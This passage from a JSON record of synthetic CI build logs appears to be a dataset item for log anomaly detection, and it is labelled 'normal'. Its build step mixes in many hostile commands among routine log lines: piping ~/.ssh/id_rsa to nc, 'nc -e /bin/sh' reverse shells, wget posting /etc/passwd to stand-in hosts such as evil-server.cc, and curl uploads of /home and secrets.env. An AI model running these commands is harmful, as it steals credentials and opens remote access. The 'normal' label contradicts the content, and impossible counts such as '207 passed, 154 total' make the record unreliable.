          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "[12:46:03] DEBUG: Loading configuration",
          "Step 15/23: Deploying",
          "Minifying vendor.js",
          "Compiling utils/service.java...",
          "Fetching from https://docker.io/package.json",
          "Tests: 258 passed, 334 total",
          "Waiting...",
          "[12:46:03] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Generating source maps...",
          "Minifying vendor.js",
          "Coverage: 89% statements, 72% branches",
          "Creating production build...",
          "\u2717 build failed with exit code 40",
          "[12:46:03] DEBUG: Loading configuration",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: dist.zip (88MB)",
          "Waiting...",
          "Cache invalidated: node_modules",
          "Verifying...",
          "HEAD is now at 0da1112",
          "Layer 1/9: RUN command",
          "Tests: 362 passed, 392 total",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Processing...",
          "Transforming 470 files...",
          "Cache saved successfully",
          "Cache invalidated: build",
          "Transforming 550 files...",
          "NODE_ENV=test",
          "Step 12/16: Linting",
          "Installing lodash@5.2.6",
          "Verifying...",
          "Compiling components/utils.go...",
          "Fetching from https://amazonaws.com/package.json",
          "Using Python 3.9",
          "Checking out main branch",
          "Ran 11 tests in 15s",
          "[12:46:03] DEBUG: Connection pool: 6 active",
          "Step 2/21: Running migrations",
          "yarn add: Done in 19.65s",
          "Step 3/21: Deploying",
          "[12:46:03] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "Artifact downloaded: 3MB",
          "Image pulled successfully",
          "  PASS: test_db_connect (201ms)",
          "npm install: added 241 packages",
          "Tests: 207 passed, 154 total",
          "[12:46:03] INFO: Request completed",
          "Waiting...",
          "Using Node.js 18.10.2",
          "npm notice: package.json updated",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/utils.go...",
          "FAILED: test_auth_login",
          "Ready.",
          "Compiling lib/index.js...",
          "[12:46:03] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:46:03] ERROR: Connection failed",
          "HEAD is now at d1c4596",
          "Fetching submodules...",
          "Step 13/18: Deploying",
          "NODE_ENV=test",
          "npm notice: package.json updated",
          "Pulling image: node:latest",
          "[12:46:03] INFO: Starting build process",
          "Bundling runtime.css",
          "HEAD is now at 771c66b",
          "yarn add: Done in 17.84s",
          "pip: Installing build dependencies...",
          "Completed.",
          "POST /upload - 202 (474ms)",
          "Compiling components/service.java...",
          "[12:46:03] DEBUG: Connection pool: 16 active",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache invalidated: dependencies",
          "Success!",
          "Verifying...",
          "\u2713 build completed",
          "yarn add: Done in 11.68s",
          "Pushing to registry...",
          "Creating production build...",
          "TLS handshake completed",
          "Pulling image: alpine:18",
          "Minifying vendor.js",
          "Using Python 3.12",
          "  PASS: test_user_create (422ms)",
          "Transforming 676 files...",
          "[12:46:03] INFO: Starting build process",
          "Using Python 3.12",
          "Time: 26.5s",
          "Step 17/22: Linting",
          "pip: Collecting webpack",
          "Artifact uploaded: dist.zip (44MB)",
          "Optimizing 69 modules...",
          "[12:46:03] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Exception: ValueError",
          "HEAD is now at 52e115b",
          "Ran 186 tests in 60s",
          "Creating production build...",
          "\u2713 Task completed in 286ms",
          "Compiling src/main.py...",
          "[12:46:03] DEBUG: Query executed in 60ms",
          "Step 18/18: Linting",
          "Pushing to registry...",
          "[12:46:03] INFO: Connecting to database",
          "Ran 181 tests in 59s",
          "Compiling src/index.js...",
          "Layer 1/9: COPY command",
          "Cache saved successfully",
          "Cache hit for key-1877",
          "Ready.",
          "npm install: resolved 719 packages",
          "pip: Downloading axios-4.1.tar.gz",
          "[12:46:03] DEBUG: Memory usage: 575MB",
          "[12:46:03] WARN: Deprecated API usage",
          "pip: Collecting express",
          "[12:46:03] INFO: Request completed",
          "Loading...",
          "Success!",
          "NODE_ENV=test",
          "  PASS: test_db_connect (183ms)",
          "Processing...",
          "Exception: ValueError",
          "Image pulled successfully",
          "Cache miss for key-8687",
          "npm install: resolved 267 packages",
          "Compiling components/main.py...",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "Step 20/24: Building",
          "yarn add: Done in 2.12s",
          "Step 12/15: Running migrations",
          "Artifact uploaded: dist.zip (58MB)",
          "Artifact downloaded: 17MB",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/handler.rs...",
          "Creating production build...",
          "pip: Collecting prettier",
          "Snapshots: 21 passed, 44 total",
          "[12:46:03] DEBUG: Connection pool: 6 active",
          "[12:46:03] ERROR: Connection failed",
          "Compiling src/handler.rs...",
          "yarn add: Done in 21.52s",
          "\u2717 build failed with exit code 23",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-17T12:47:49.233106",
        "finished_at": "2025-12-17T12:48:09.934501",
        "log_lines": [
          "=== Step: build ===",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:46:03] DEBUG: Connection pool: 15 active",
          "Test Suites: 18 passed, 17 total",
          "POST /upload - 200 (289ms)",
          "Layer 6/8: COPY command",
          "Cache restored successfully (484MB)",
          "Step 13/16: Testing",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 39.48.133.148 47616",
          "[12:46:03] ERROR: Connection failed",
          "Using Python 3.9",
          "[12:46:03] INFO: Connecting to database",
          "NODE_ENV=development",
          "TLS handshake completed",
          "Cache invalidated: dependencies",
          "FAILED: test_cache_hit",
          "[12:46:03] INFO: Starting build process",
          "[12:46:03] DEBUG: Initializing service",
          "Compiling components/handler.rs...",
          "\u2713 Task completed in 2542ms",
          "Completed.",
          "Artifact uploaded: dist.zip (98MB)",
          "Step 7/25: Linting",
          "Environment: development",
          "nc -e /bin/sh 216.31.112.84 10887",
          "Ran 164 tests in 52s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "pip: Collecting lodash",
          "Ready.",
          "[12:46:03] WARN: Deprecated API usage",
          "\u2713 Step 'test' succeeded",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Already up to date.",
          "[12:46:03] INFO: Request completed",
          "Cache hit for key-8943",
          "Already up to date.",
          "HEAD is now at 5d61aaf",
          "Fetching submodules...",
          "Building Docker image...",
          "WARNING: react has known vulnerabilities",
          "[12:46:03] ERROR: Connection failed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "  PASS: integration/test_api_health.spec.js",
          "Creating production build...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Tests: 385 passed, 221 total",
          "Cache saved successfully",
          "Test Suites: 30 passed, 24 total",
          "Step 9/24: Building",
          "HEAD is now at 9af1837",
          "Installing express@1.0.5",
          "Processing...",
          "Processing...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Already up to date.",
          "[12:46:03] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 224.17.187.231 59944",
          "Bundling styles.js",
          "Loading...",
          "yarn add: Done in 9.90s",
          "pip install: Successfully installed axios-2.15",
          "Environment: test",
          "[12:46:03] INFO: Starting build process",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-317'",
          "Artifact downloaded: 33MB",
          "TLS handshake completed",
          "OK",
          "Step 7/25: Building",
          "Checking out master branch",
          "Platform: darwin-arm64",
          "\u2713 build completed",
          "Snapshots: 34 passed, 24 total",
          "Cache invalidated: build",
          "Bundling runtime.css",
          "Transforming 534 files...",
          "Creating production build...",
          "[12:46:03] DEBUG: Initializing service",
          "Verifying...",
          "[12:46:03] DEBUG: Memory usage: 233MB",
          "\u2713 test completed",
          "Artifact uploaded: dist.zip (26MB)",
          "Cache miss for key-4820",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Compiling lib/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Artifact downloaded: 8MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:03] INFO: Request completed",
          "POST /upload - 200 (247ms)",
          "[12:46:03] INFO: Request completed",
          "\u2713 Step 'setup' succeeded",
          "Coverage: 74% statements, 67% branches",
          "Optimizing 30 modules...",
          "POST /upload - 201 (214ms)",
          "[12:46:03] DEBUG: Loading configuration",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Creating production build...",
          "Connection established",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 246.88.65.39 49924",
          "Step 20/15: Building",
          "Step 1/24: Running migrations",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Compiling utils/service.java...",
          "Time: 17.937s",
          "Step 20/17: Deploying",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Cache hit for key-6079",
          "Fetching submodules...",
          "Success!",
          "Loading...",
          "Optimizing 44 modules...",
          "[12:46:03] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/main.py...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:03] INFO: Request completed",
          "[12:46:03] WARN: Deprecated API usage",
          "Cache restored successfully (94MB)",
          "nc -e /bin/sh 170.128.207.109 39696",
          "[12:46:03] INFO: Processing request",
          "yarn add: Done in 6.58s",
          "  PASS: test_auth_login (82ms)",
          "Using Node.js 15.15.2",
          "Artifact uploaded: dist.zip (21MB)",
          "Pulling image: alpine:3.11",
          "Layer 5/15: ENV command",
          "Tests: 196 passed, 121 total",
          "Test Suites: 47 passed, 32 total",
          "Transforming 818 files...",
          "Step 2/22: Running migrations",
          "yarn add: Done in 6.93s",
          "Minifying vendor.js",
          "[12:46:03] DEBUG: Connection pool: 1 active",
          "[12:46:03] DEBUG: Initializing service",
          "Step 14/23: Testing",
          "WARNING: prettier has known vulnerabilities",
          "NODE_ENV=development",
          "Platform: linux-x64",
          "Cache invalidated: node_modules",
          "Environment: staging",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: dist.zip (33MB)",
          "Artifact downloaded: 24MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 85.143.192.100 35845",
          "Artifact uploaded: dist.zip (41MB)",
          "Connection established",
          "[12:46:03] DEBUG: Query executed in 64ms",
          "Minifying app.js",
          "[12:46:03] DEBUG: Memory usage: 1923MB",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "nc -e /bin/sh 222.204.252.73 30506",
          "Image pulled successfully",
          "Completed.",
          "Step 20/15: Running migrations",
          "Cache miss for key-2331",
          "Fetching submodules...",
          "Environment: test",
          "  PASS: unit/test_user_create.spec.js",
          "pip: Collecting webpack",
          "HEAD is now at cbdcf93",
          "[12:46:03] ERROR: Connection failed",
          "[12:46:03] DEBUG: Initializing service",
          "[12:46:03] INFO: Processing request",
          "Test Suites: 25 passed, 39 total",
          "Sending 88MB of data to crypto-mine.io",
          "Installing webpack@4.4.10",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "  PASS: test_auth_login (207ms)",
          "  PASS: unit/test_api_health.spec.js",
          "Transforming 838 files...",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}